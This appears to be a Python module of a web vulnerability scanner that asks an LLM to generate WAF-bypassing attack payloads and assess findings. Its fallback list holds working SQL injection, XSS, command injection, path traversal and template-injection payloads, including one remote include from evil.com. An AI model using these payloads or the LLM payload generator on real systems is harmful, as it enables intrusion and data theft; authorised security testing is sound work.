"""AI Module - LLM-powered payload generation and vulnerability analysis.

Supports OpenAI-compatible API (OpenAI, Ollama, custom endpoints).
"""

import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import config

try:
    from openai import OpenAI
    HAS_OPENAI = True
except ImportError:
    HAS_OPENAI = False

from lib.logger import log


class AIEngine:
    """LLM-powered security analysis engine."""

    def __init__(self):
        self.enabled = HAS_OPENAI and bool(config.AI_API_KEY or config.AI_PROVIDER == "ollama")
        self.client = None

        if self.enabled:
            self.client = OpenAI(
                api_key=config.AI_API_KEY or "ollama",
                base_url=config.AI_BASE_URL if config.AI_PROVIDER != "ollama" else "http://localhost:11434/v1",
            )
            log.info(f"AI engine initialized: {config.AI_PROVIDER} / {config.AI_MODEL}")
        else:
            log.warning("AI engine disabled (no API key or openai package not installed)")

    def _chat(self, system_prompt, user_prompt, temperature=0.7):
        """Send a chat completion request."""
        if not self.enabled or not self.client:
            return None
        try:
            resp = self.client.chat.completions.create(
                model=config.AI_MODEL,
                messages=[
                    {"role": "system", "content": system_prompt},
                    {"role": "user", "content": user_prompt},
                ],
                temperature=temperature,
                max_tokens=2000,
            )
            return resp.choices[0].message.content.strip()
        except Exception as e:
            log.error(f"AI request failed: {e}")
            return None

    def generate_payloads(self, vuln_type, context=None):
        """Generate attack payloads for a given vulnerability type.

        Args:
            vuln_type: 'sqli', 'xss', 'cmd_injection', 'file_include', 'ssti'
            context: dict with optional keys: url, param, response_snippet, technology

        Returns:
            list of payload strings, or empty list if AI unavailable
        """
        system = """You are a penetration testing expert. Generate practical attack payloads for security testing.
Return ONLY a JSON array of payload strings, no explanation. Each payload should be distinct and test a different attack vector.
Focus on bypassing common WAFs and filters. Include both classic and advanced variants."""

        ctx = context or {}
        user = f"""Generate 15-20 {vuln_type} payloads for security testing.

Target URL: {ctx.get('url', 'N/A')}
Parameter: {ctx.get('param', 'N/A')}
Detected technology: {ctx.get('technology', 'N/A')}
Server response snippet: {ctx.get('response_snippet', 'N/A')[:500]}

Return as JSON array of strings only. Example: ["payload1", "payload2"]"""

        result = self._chat(system, user, temperature=0.8)
        if not result:
            return self._fallback_payloads(vuln_type)

        try:
            # Extract JSON array from response
            start = result.find("[")
            end = result.rfind("]") + 1
            if start >= 0 and end > start:
                return json.loads(result[start:end])
        except json.JSONDecodeError:
            pass

        return self._fallback_payloads(vuln_type)

    def analyze_vulnerability(self, vuln_type, url, param, request_data, response_data):
        """Analyze a potential vulnerability and provide detailed assessment.

        Returns:
            dict with keys: confirmed, severity, description, remediation, cve_refs
        """
        system = """You are a senior security analyst. Analyze the provided HTTP request/response data 
to determine if a vulnerability exists. Be precise and evidence-based.
Return a JSON object with these keys:
- confirmed: bool (true if vulnerability is confirmed)
- severity: str ("critical", "high", "medium", "low", "info")
- description: str (detailed description of the vulnerability)
- remediation: str (how to fix it)
- cve_refs: list of related CVE IDs if known
- attack_vector: str (how the vulnerability can be exploited)
- impact: str (what an attacker could achieve)"""

        user = f"""Analyze this potential {vuln_type} vulnerability:

URL: {url}
Parameter: {param}
Request: {str(request_data)[:1000]}
Response (truncated): {str(response_data)[:2000]}

Return analysis as JSON object."""

        result = self._chat(system, user, temperature=0.3)
        if not result:
            return {
                "confirmed": False,
                "severity": "unknown",
                "description": "AI analysis unavailable",
                "remediation": "Manual verification required",
            }

        try:
            start = result.find("{")
            end = result.rfind("}") + 1
            if start >= 0 and end > start:
                return json.loads(result[start:end])
        except json.JSONDecodeError:
            pass

        return {
            "confirmed": False,
            "severity": "unknown",
            "description": result[:500],
            "remediation": "Manual verification required",
        }

    def fingerprint_technology(self, headers, body, url):
        """Identify web technologies from HTTP response."""
        system = """You are a web technology fingerprinting expert.
Analyze HTTP headers and HTML body to identify technologies.
Return JSON: {"server": str, "language": str, "framework": str, "cms": str, "waf": str, "other": [str]}"""

        user = f"""Identify technologies for: {url}

Response Headers:
{str(headers)[:1500]}

Response Body (truncated):
{str(body)[:2000]}

Return as JSON."""

        result = self._chat(system, user, temperature=0.2)
        if not result:
            return {}

        try:
            start = result.find("{")
            end = result.rfind("}") + 1
            if start >= 0 and end > start:
                return json.loads(result[start:end])
        except json.JSONDecodeError:
            pass
        return {}

    def generate_report_summary(self, scan_results):
        """Generate a human-readable executive summary of scan results."""
        system = """You are a security consultant writing an executive summary for a vulnerability assessment report.
Be concise, professional, and actionable. Write in Chinese if the user context suggests it, otherwise English."""

        vulns = scan_results.get("vulnerabilities", [])
        vuln_summary = json.dumps([
            {"type": v.get("type"), "severity": v.get("severity"), "url": v.get("url")}
            for v in vulns[:50]
        ], ensure_ascii=False)

        user = f"""Generate an executive summary for this scan:

Target: {scan_results.get('target', 'N/A')}
Total URLs scanned: {scan_results.get('total_urls', 0)}
Vulnerabilities found: {len(vulns)}
By severity: {scan_results.get('by_severity', {})}

Vulnerability list (first 50):
{vuln_summary}

Write a concise executive summary with:
1. Overall risk assessment
2. Critical findings
3. Top 3 recommendations"""

        return self._chat(system, user, temperature=0.5)

    def _fallback_payloads(self, vuln_type):
        """Return built-in fallback payloads when AI is unavailable."""
        payloads = {
            "sqli": [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "1' ORDER BY 1--",
                "1' ORDER BY 10--",
                "1' UNION SELECT NULL--",
                "1' UNION SELECT NULL,NULL--",
                "1' UNION SELECT NULL,NULL,NULL--",
                "admin'--",
                "1' AND 1=1--",
                "1' AND 1=2--",
                "1' AND SLEEP(3)--",
                "1'; WAITFOR DELAY '0:0:3'--",
                "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
                "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
            ],
            "xss": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "'-alert(1)-'",
                "';alert(1)//",
                "<details open ontoggle=alert(1)>",
                "<body onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<marquee onstart=alert(1)>",
                "javascript:alert(1)",
                "<video><source onerror=alert(1)>",
            ],
            "cmd_injection": [
                "; id",
                "| id",
                "|| id",
                "&& id",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "; whoami",
                "| whoami",
                "$(whoami)",
                "`whoami`",
                "; sleep 5",
                "| sleep 5",
                "; ping -c 3 127.0.0.1",
                "| ping -c 3 127.0.0.1",
            ],
            "file_include": [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "..%252f..%252f..%252fetc/passwd",
                "php://filter/convert.base64-encode/resource=index.php",
                "php://input",
                "/etc/passwd",
                "C:\\windows\\win.ini",
                "expect://id",
                "http://evil.com/shell.txt",
                "file:///etc/passwd",
                "..\\..\\..\\etc\\passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            ],
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "#{7*7}",
                "{{config}}",
                "{{self.__class__.__mro__[2].__subclasses__()}}",
                "{{request.application.__globals__.__builtins__.__import__(\"os\").popen(\"id\").read()}}",
            ],
        }
        return payloads.get(vuln_type, [])
